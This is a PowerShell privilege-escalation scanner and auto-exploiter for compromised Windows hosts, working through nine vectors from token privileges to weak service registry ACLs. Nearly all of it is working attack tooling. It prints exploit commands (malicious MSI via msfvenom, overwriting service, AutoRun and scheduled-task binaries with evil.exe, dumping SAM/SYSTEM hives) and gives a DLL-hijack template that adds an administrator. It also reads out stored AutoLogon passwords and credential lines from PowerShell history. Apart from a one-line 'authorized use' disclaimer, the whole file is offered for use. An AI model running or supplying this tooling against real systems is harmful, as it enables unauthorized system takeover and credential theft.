# AutoPrivEsc.ps1
# Windows Privilege Escalation Scanner & Auto-Exploiter
# ========================================================
# Runs on a compromised Windows machine as a low-privilege user.
# Scans for common privilege escalation vectors and attempts
# to exploit each one automatically.
#
# Usage:
#   powershell -ep bypass -f AutoPrivEsc.ps1
#   powershell -ep bypass -f AutoPrivEsc.ps1 -ScanOnly
#   powershell -ep bypass -f AutoPrivEsc.ps1 -Report
#
# WARNING: For authorized use in CTF, lab, and pentest environments only.

param(
    [switch]$ScanOnly,   # Scan only — no exploitation
    [switch]$Report      # Save report to disk
)

# ─────────────────────────────────────────────
# Colors & Output Helpers
# ─────────────────────────────────────────────

function Write-Found   { param($msg) Write-Host "  [FOUND] $msg"     -ForegroundColor Yellow }
function Write-Exploit { param($msg) Write-Host "  [EXPLOIT] $msg"   -ForegroundColor Green  }
function Write-Failed  { param($msg) Write-Host "  [FAILED] $msg"    -ForegroundColor Red    }
function Write-Info    { param($msg) Write-Host "  [*] $msg"         -ForegroundColor Cyan   }
function Write-Skip    { param($msg) Write-Host "  [-] $msg"         -ForegroundColor Gray   }
function Write-Section { param($msg) 
    Write-Host ""
    Write-Host ("=" * 55) -ForegroundColor Cyan
    Write-Host "  $msg"   -ForegroundColor White
    Write-Host ("=" * 55) -ForegroundColor Cyan
}

# ─────────────────────────────────────────────
# Results Tracker
# ─────────────────────────────────────────────

$global:Results = @{
    Found     = [System.Collections.ArrayList]@()
    Exploited = [System.Collections.ArrayList]@()
    Failed    = [System.Collections.ArrayList]@()
}

function Log-Found   { param($vector, $detail) [void]$global:Results.Found.Add(@{Vector=$vector; Detail=$detail}) }
function Log-Exploit { param($vector, $cmd)    [void]$global:Results.Exploited.Add(@{Vector=$vector; Cmd=$cmd})   }
function Log-Failed  { param($vector, $reason) [void]$global:Results.Failed.Add(@{Vector=$vector; Reason=$reason}) }


# ─────────────────────────────────────────────
# Helper — Run Command Silently
# ─────────────────────────────────────────────

function Run-Cmd {
    param([string]$cmd)
    try {
        return (cmd /c $cmd 2>$null) -join "`n"
    } catch {
        return ""
    }
}


# ─────────────────────────────────────────────
# System Info
# ─────────────────────────────────────────────

function Get-SysInfo {
    Write-Section "SYSTEM INFORMATION"

    $os      = (Get-WmiObject Win32_OperatingSystem).Caption
    $version = (Get-WmiObject Win32_OperatingSystem).Version
    $arch    = $env:PROCESSOR_ARCHITECTURE
    $host_   = $env:COMPUTERNAME
    $user    = "$env:USERDOMAIN\$env:USERNAME"
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    Write-Host ""
    Write-Host "  Hostname  : $host_"
    Write-Host "  User      : $user"
    Write-Host "  OS        : $os"
    Write-Host "  Version   : $version"
    Write-Host "  Arch      : $arch"
    Write-Host "  Is Admin  : $isAdmin" -ForegroundColor $(if ($isAdmin) { "Green" } else { "Red" })

    if ($isAdmin) {
        Write-Host "`n  Already running as Administrator!" -ForegroundColor Green
        exit 0
    }

    Write-Host ""
    Write-Info "Current token privileges:"
    whoami /priv 2>$null
}


# ─────────────────────────────────────────────
# Vector 1 — Token Privileges
# ─────────────────────────────────────────────

function Check-TokenPrivileges {
    param([bool]$Exploit)
    Write-Section "VECTOR 1 — Token Privileges (Potato Attacks)"

    $privs = (whoami /priv 2>$null) -join "`n"

    $dangerous = @{
        "SeImpersonatePrivilege"         = "PrintSpoofer / GodPotato -> SYSTEM"
        "SeAssignPrimaryTokenPrivilege"  = "PrintSpoofer / GodPotato -> SYSTEM"
        "SeDebugPrivilege"               = "Inject into SYSTEM processes / getsystem"
        "SeBackupPrivilege"              = "Read SAM/SYSTEM hives -> dump hashes"
        "SeRestorePrivilege"             = "Write anywhere on filesystem"
        "SeTakeOwnershipPrivilege"       = "Take ownership of any file/registry key"
        "SeLoadDriverPrivilege"          = "Load malicious kernel driver"
    }

    $found = $false
    foreach ($priv in $dangerous.Keys) {
        if ($privs -match $priv) {
            Write-Found "$priv is present!"
            Log-Found "TOKEN_PRIV" "$priv"
            $found = $true

            if ($Exploit) {
                $exploit_hint = $dangerous[$priv]
                Write-Exploit "Recommended technique: $exploit_hint"

                if ($priv -in @("SeImpersonatePrivilege","SeAssignPrimaryTokenPrivilege")) {
                    Write-Host ""
                    Write-Host "  Download PrintSpoofer: https://github.com/itm4n/PrintSpoofer/releases" -ForegroundColor Yellow
                    Write-Host "  Run: PrintSpoofer.exe -i -c cmd.exe" -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "  Or GodPotato: https://github.com/BeichenDream/GodPotato/releases" -ForegroundColor Yellow
                    Write-Host "  Run: GodPotato.exe -cmd `"cmd /c whoami`"" -ForegroundColor Yellow
                    Log-Exploit "TOKEN_PRIV" "PrintSpoofer.exe -i -c cmd.exe"
                }

                elseif ($priv -eq "SeBackupPrivilege") {
                    $cmd = 'reg save HKLM\SAM C:\Temp\SAM & reg save HKLM\SYSTEM C:\Temp\SYSTEM'
                    Write-Host "  Run: $cmd" -ForegroundColor Yellow
                    Log-Exploit "SeBackupPrivilege" $cmd
                }
            }
        }
    }

    if (-not $found) {
        Write-Skip "No dangerous token privileges found."
    }
}


# ─────────────────────────────────────────────
# Vector 2 — AlwaysInstallElevated
# ─────────────────────────────────────────────

function Check-AlwaysInstallElevated {
    param([bool]$Exploit)
    Write-Section "VECTOR 2 — AlwaysInstallElevated"
    Write-Info "Checking registry keys..."

    $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated
    $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -EA SilentlyContinue).AlwaysInstallElevated

    if ($hklm -eq 1 -and $hkcu -eq 1) {
        Write-Found "AlwaysInstallElevated is ENABLED in both HKLM and HKCU!"
        Log-Found "ALWAYS_INSTALL_ELEVATED" "Both keys = 1"

        if ($Exploit) {
            Write-Host ""
            Write-Host "  Generate malicious MSI with msfvenom:" -ForegroundColor Yellow
            Write-Host "  msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o evil.msi" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "  Install it:" -ForegroundColor Yellow
            Write-Host "  msiexec /quiet /qn /i evil.msi" -ForegroundColor Yellow
            Log-Exploit "ALWAYS_INSTALL_ELEVATED" "msiexec /quiet /qn /i evil.msi"
        }
    } else {
        Write-Skip "AlwaysInstallElevated not enabled (HKLM=$hklm, HKCU=$hkcu)"
    }
}


# ─────────────────────────────────────────────
# Vector 3 — Unquoted Service Paths
# ─────────────────────────────────────────────

function Check-UnquotedServicePaths {
    param([bool]$Exploit)
    Write-Section "VECTOR 3 — Unquoted Service Paths"
    Write-Info "Scanning services for unquoted paths with spaces..."

    $services = Get-WmiObject Win32_Service | Where-Object {
        $_.PathName -and
        $_.PathName -notmatch '^"' -and
        $_.PathName -match " " -and
        $_.PathName -notmatch "^C:\\Windows\\"
    }

    if (-not $services) {
        Write-Skip "No unquoted service paths found."
        return
    }

    foreach ($svc in $services) {
        $path = $svc.PathName
        Write-Found "Service: $($svc.Name)"
        Write-Host "         Path: $path" -ForegroundColor Gray
        Log-Found "UNQUOTED_SERVICE" "$($svc.Name): $path"

        if ($Exploit) {
            # Find the exploitable insertion point
            $parts  = $path.Split("\")
            $built  = ""
            foreach ($part in $parts) {
                if ($built -ne "") { $built += "\" }
                $built += $part
                if ($part -match " " -and -not $part.StartsWith('"')) {
                    $inject = $built.Split(" ")[0] + ".exe"
                    $dir    = Split-Path $inject -Parent
                    if (Test-Path $dir) {
                        $acl = Get-Acl $dir -EA SilentlyContinue
                        $writable = $acl.Access | Where-Object {
                            $_.FileSystemRights -match "Write|FullControl" -and
                            $_.IdentityReference -match $env:USERNAME
                        }
                        if ($writable) {
                            Write-Exploit "Writable injection point: $inject"
                            Write-Host "  Copy payload: copy evil.exe `"$inject`"" -ForegroundColor Yellow
                            Write-Host "  Then restart: sc stop $($svc.Name) & sc start $($svc.Name)" -ForegroundColor Yellow
                            Log-Exploit "UNQUOTED_SERVICE" "copy evil.exe `"$inject`""
                        }
                    }
                    break
                }
            }
        }
    }
}


# ─────────────────────────────────────────────
# Vector 4 — Weak Service Permissions
# ─────────────────────────────────────────────

function Check-WeakServicePermissions {
    param([bool]$Exploit)
    Write-Section "VECTOR 4 — Weak Service Binary Permissions"
    Write-Info "Checking if service binaries are writable..."

    $services = Get-WmiObject Win32_Service | Where-Object { $_.PathName }
    $found    = $false

    foreach ($svc in $services) {
        # Extract exe path — strip quotes and arguments
        $raw  = $svc.PathName
        $exe  = ($raw -replace '^"([^"]+)".*', '$1') -replace "^([^ ]+\.exe).*", '$1'

        if (-not (Test-Path $exe -EA SilentlyContinue)) { continue }

        try {
            $acl      = Get-Acl $exe -EA SilentlyContinue
            $writable = $acl.Access | Where-Object {
                $_.FileSystemRights -match "Write|FullControl" -and
                $_.IdentityReference -match "$env:USERNAME|Everyone|Users|Authenticated"
            }

            if ($writable) {
                Write-Found "Writable service binary: $exe ($($svc.Name))"
                Log-Found "WEAK_SERVICE_BINARY" "$exe"
                $found = $true

                if ($Exploit) {
                    Write-Host "  Replace: copy evil.exe `"$exe`"" -ForegroundColor Yellow
                    Write-Host "  Start:   sc start $($svc.Name)" -ForegroundColor Yellow
                    Log-Exploit "WEAK_SERVICE_BINARY" "copy evil.exe `"$exe`" && sc start $($svc.Name)"
                }
            }
        } catch {}
    }

    if (-not $found) {
        Write-Skip "No writable service binaries found."
    }
}


# ─────────────────────────────────────────────
# Vector 5 — Stored Credentials
# ─────────────────────────────────────────────

function Check-StoredCredentials {
    param([bool]$Exploit)
    Write-Section "VECTOR 5 — Stored Credentials"

    # cmdkey
    Write-Info "Checking Windows Credential Manager..."
    $cmdkey = cmdkey /list 2>$null
    if ($cmdkey -match "Target:") {
        Write-Found "Stored credentials in Credential Manager!"
        Write-Host ($cmdkey | Out-String) -ForegroundColor Gray
        Log-Found "CMDKEY_CREDS" ($cmdkey | Out-String)

        if ($Exploit) {
            Write-Host '  runas /savecred /user:DOMAIN\Administrator "cmd.exe"' -ForegroundColor Yellow
            Log-Exploit "CMDKEY_CREDS" 'runas /savecred /user:DOMAIN\Administrator "cmd.exe"'
        }
    } else {
        Write-Skip "No credentials in Credential Manager."
    }

    # AutoLogon
    Write-Info "Checking AutoLogon registry keys..."
    $winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $user_    = (Get-ItemProperty $winlogon -Name DefaultUserName     -EA SilentlyContinue).DefaultUserName
    $pass     = (Get-ItemProperty $winlogon -Name DefaultPassword     -EA SilentlyContinue).DefaultPassword
    $domain   = (Get-ItemProperty $winlogon -Name DefaultDomainName   -EA SilentlyContinue).DefaultDomainName

    if ($pass) {
        Write-Found "AutoLogon credentials found!"
        Write-Host "  User   : $user_"   -ForegroundColor Yellow
        Write-Host "  Pass   : $pass"    -ForegroundColor Yellow
        Write-Host "  Domain : $domain"  -ForegroundColor Yellow
        Log-Found "AUTOLOGON" "User=$user_ Pass=$pass"
    } else {
        Write-Skip "No AutoLogon credentials."
    }

    # Unattend files
    Write-Info "Searching for unattended install files..."
    $unattend_paths = @(
        "C:\Windows\Panther\Unattend.xml",
        "C:\Windows\Panther\Unattended.xml",
        "C:\Windows\System32\sysprep\sysprep.xml",
        "C:\Windows\System32\sysprep\Panther\unattend.xml",
        "C:\unattend.xml",
        "C:\autounattend.xml"
    )

    foreach ($path in $unattend_paths) {
        if (Test-Path $path) {
            Write-Found "Unattended install file: $path"
            Log-Found "UNATTEND_FILE" $path

            $content = Get-Content $path -EA SilentlyContinue | Out-String
            if ($content -match "Password|password") {
                Write-Host "  File contains password fields!" -ForegroundColor Yellow
                Log-Exploit "UNATTEND_FILE" "Get-Content $path"
            }
        }
    }

    # PowerShell history
    Write-Info "Checking PowerShell command history..."
    $hist_path = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $hist_path) {
        $hist = Get-Content $hist_path -EA SilentlyContinue
        $cred_lines = $hist | Where-Object { $_ -match "password|passwd|cred|secret|key" }
        if ($cred_lines) {
            Write-Found "Credential-related commands in PowerShell history!"
            $cred_lines | ForEach-Object { Write-Host "  $_" -ForegroundColor Yellow }
            Log-Found "PS_HISTORY" ($cred_lines -join "; ")
        } else {
            Write-Skip "Nothing interesting in PowerShell history."
        }
    }
}


# ─────────────────────────────────────────────
# Vector 6 — AutoRun Registry Keys
# ─────────────────────────────────────────────

function Check-AutoRun {
    param([bool]$Exploit)
    Write-Section "VECTOR 6 — AutoRun Registry Keys"
    Write-Info "Checking Run/RunOnce keys for writable binaries..."

    $run_keys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    )

    $found = $false

    foreach ($key in $run_keys) {
        if (-not (Test-Path $key)) { continue }

        $values = Get-ItemProperty $key -EA SilentlyContinue
        $values.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            $name = $_.Name
            $val  = $_.Value
            $exe  = ($val -replace '^"([^"]+)".*', '$1') -replace "^([^ ]+\.exe).*", '$1'

            Write-Info "$key -> $name = $val"

            if (Test-Path $exe -EA SilentlyContinue) {
                try {
                    $acl = Get-Acl $exe -EA SilentlyContinue
                    $writable = $acl.Access | Where-Object {
                        $_.FileSystemRights -match "Write|FullControl" -and
                        $_.IdentityReference -match "$env:USERNAME|Everyone|Users"
                    }
                    if ($writable) {
                        Write-Found "Writable AutoRun binary: $exe"
                        Log-Found "AUTORUN" $exe
                        $found = $true

                        if ($Exploit) {
                            Write-Host "  copy evil.exe `"$exe`"" -ForegroundColor Yellow
                            Write-Host "  Payload runs on next login/reboot" -ForegroundColor Yellow
                            Log-Exploit "AUTORUN" "copy evil.exe `"$exe`""
                        }
                    }
                } catch {}
            }
        }
    }

    if (-not $found) {
        Write-Skip "No writable AutoRun binaries found."
    }
}


# ─────────────────────────────────────────────
# Vector 7 — Scheduled Tasks
# ─────────────────────────────────────────────

function Check-ScheduledTasks {
    param([bool]$Exploit)
    Write-Section "VECTOR 7 — Scheduled Tasks"
    Write-Info "Looking for SYSTEM tasks with writable binaries..."

    $found = $false

    try {
        $tasks = Get-ScheduledTask -EA SilentlyContinue | Where-Object {
            $_.Principal.RunLevel -eq "Highest" -or
            $_.Principal.UserId -match "SYSTEM|Administrator"
        }

        foreach ($task in $tasks) {
            $action = $task.Actions | Select-Object -First 1
            $exe    = $action.Execute

            if (-not $exe -or -not (Test-Path $exe -EA SilentlyContinue)) { continue }

            try {
                $acl = Get-Acl $exe -EA SilentlyContinue
                $writable = $acl.Access | Where-Object {
                    $_.FileSystemRights -match "Write|FullControl" -and
                    $_.IdentityReference -match "$env:USERNAME|Everyone|Users"
                }

                if ($writable) {
                    Write-Found "Writable SYSTEM task binary: $exe"
                    Write-Host "  Task: $($task.TaskName)" -ForegroundColor Gray
                    Log-Found "SCHED_TASK" "$($task.TaskName): $exe"
                    $found = $true

                    if ($Exploit) {
                        Write-Host "  1. copy evil.exe `"$exe`"" -ForegroundColor Yellow
                        Write-Host "  2. Start-ScheduledTask -TaskName '$($task.TaskName)'" -ForegroundColor Yellow
                        Log-Exploit "SCHED_TASK" "copy evil.exe `"$exe`" && Start-ScheduledTask '$($task.TaskName)'"
                    }
                }
            } catch {}
        }
    } catch {
        Write-Skip "Could not enumerate scheduled tasks."
    }

    if (-not $found) {
        Write-Skip "No exploitable scheduled tasks found."
    }
}


# ─────────────────────────────────────────────
# Vector 8 — DLL Hijacking
# ─────────────────────────────────────────────

function Check-DLLHijacking {
    param([bool]$Exploit)
    Write-Section "VECTOR 8 — DLL Hijacking"
    Write-Info "Checking PATH for writable non-system directories..."

    $path_dirs = $env:PATH -split ";"
    $found     = $false

    foreach ($dir in $path_dirs) {
        if (-not $dir -or -not (Test-Path $dir -EA SilentlyContinue)) { continue }
        if ($dir -match "System32|SysWOW64|Windows") { continue }

        try {
            $test_file = Join-Path $dir "test_write_$([guid]::NewGuid()).tmp"
            [IO.File]::WriteAllText($test_file, "test")
            Remove-Item $test_file -EA SilentlyContinue

            Write-Found "Writable PATH directory: $dir"
            Log-Found "DLL_HIJACK" $dir
            $found = $true

            if ($Exploit) {
                Write-Host ""
                Write-Host "  Minimal DLL template (C++):" -ForegroundColor Yellow
                Write-Host @"
  #include <windows.h>
  BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lp) {
      if (reason == DLL_PROCESS_ATTACH)
          WinExec("net localgroup administrators hacker /add", 0);
      return TRUE;
  }
"@ -ForegroundColor Gray
                Write-Host "  Place compiled DLL as: $dir\<target_dll_name>.dll" -ForegroundColor Yellow
                Log-Exploit "DLL_HIJACK" "Plant malicious DLL in $dir"
            }
        } catch {}
    }

    if (-not $found) {
        Write-Skip "No writable non-system PATH directories found."
    }
}


# ─────────────────────────────────────────────
# Vector 9 — Weak Registry Permissions
# ─────────────────────────────────────────────

function Check-WeakRegistryPermissions {
    param([bool]$Exploit)
    Write-Section "VECTOR 9 — Weak Registry Permissions on Services"
    Write-Info "Checking if service registry keys are writable..."

    $found = $false

    try {
        $services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA SilentlyContinue

        foreach ($svc in $services) {
            try {
                $acl = Get-Acl $svc.PSPath -EA SilentlyContinue
                $writable = $acl.Access | Where-Object {
                    $_.RegistryRights -match "WriteKey|FullControl|SetValue" -and
                    $_.IdentityReference -match "$env:USERNAME|Everyone|Users|Authenticated"
                }

                if ($writable) {
                    Write-Found "Writable registry key: $($svc.Name)"
                    Log-Found "WEAK_REGISTRY" $svc.Name
                    $found = $true

                    if ($Exploit) {
                        Write-Host "  Modify ImagePath to point to your payload:" -ForegroundColor Yellow
                        Write-Host "  Set-ItemProperty -Path '$($svc.PSPath)' -Name ImagePath -Value 'C:\Temp\evil.exe'" -ForegroundColor Yellow
                        Write-Host "  sc start $($svc.Name)" -ForegroundColor Yellow
                        Log-Exploit "WEAK_REGISTRY" "Set ImagePath of $($svc.Name) to evil.exe"
                    }
                }
            } catch {}
        }
    } catch {
        Write-Skip "Could not check registry permissions."
    }

    if (-not $found) {
        Write-Skip "No writable service registry keys found."
    }
}


# ─────────────────────────────────────────────
# Final Report
# ─────────────────────────────────────────────

function Print-Report {
    param([bool]$SaveReport)

    Write-Section "FINAL REPORT"

    Write-Host ""
    Write-Host "  User      : $env:USERDOMAIN\$env:USERNAME"
    Write-Host "  Scan time : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host ""
    Write-Host "  Vectors found   : $($global:Results.Found.Count)"    -ForegroundColor Yellow
    Write-Host "  Exploits ready  : $($global:Results.Exploited.Count)" -ForegroundColor Green
    Write-Host "  Failed attempts : $($global:Results.Failed.Count)"   -ForegroundColor Red

    if ($global:Results.Exploited.Count -gt 0) {
        Write-Host ""
        Write-Host "  EXPLOIT COMMANDS TO RUN:" -ForegroundColor Green
        foreach ($item in $global:Results.Exploited) {
            Write-Host ""
            Write-Host "    [$($item.Vector)]"    -ForegroundColor Cyan
            Write-Host "    $($item.Cmd)"         -ForegroundColor Yellow
        }
    }

    if ($global:Results.Found.Count -eq 0) {
        Write-Host ""
        Write-Host "  No obvious vectors found." -ForegroundColor Red
        Write-Host "  Consider: kernel exploits, Kerberoasting, AS-REP Roasting, GPP passwords."
    }

    if ($SaveReport) {
        $report_path = "$env:TEMP\privesc_report_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $lines = @()
        $lines += "AutoPrivEsc Report — $(Get-Date)"
        $lines += "User: $env:USERDOMAIN\$env:USERNAME"
        $lines += "=" * 50
        $lines += ""
        $lines += "FOUND:"
        foreach ($item in $global:Results.Found) { $lines += "  [$($item.Vector)] $($item.Detail)" }
        $lines += ""
        $lines += "EXPLOITED:"
        foreach ($item in $global:Results.Exploited) { $lines += "  [$($item.Vector)] $($item.Cmd)" }
        $lines | Out-File $report_path -Encoding UTF8
        Write-Host ""
        Write-Host "  Report saved to: $report_path" -ForegroundColor Green
    }
}


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

Write-Host ""
Write-Host ("=" * 55) -ForegroundColor Cyan
Write-Host "  AutoPrivEsc — Windows PrivEsc (PowerShell)" -ForegroundColor White
Write-Host ("=" * 55) -ForegroundColor Cyan
Write-Host "  User   : $env:USERDOMAIN\$env:USERNAME"
Write-Host "  Mode   : $(if ($ScanOnly) { 'SCAN ONLY' } else { 'SCAN + EXPLOIT' })"
Write-Host "  Time   : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host ("=" * 55) -ForegroundColor Cyan

$exploit = -not $ScanOnly

Get-SysInfo
Check-TokenPrivileges          -Exploit $exploit
Check-AlwaysInstallElevated    -Exploit $exploit
Check-UnquotedServicePaths     -Exploit $exploit
Check-WeakServicePermissions   -Exploit $exploit
Check-StoredCredentials        -Exploit $exploit
Check-AutoRun                  -Exploit $exploit
Check-ScheduledTasks           -Exploit $exploit
Check-DLLHijacking             -Exploit $exploit
Check-WeakRegistryPermissions  -Exploit $exploit

Print-Report -SaveReport $Report
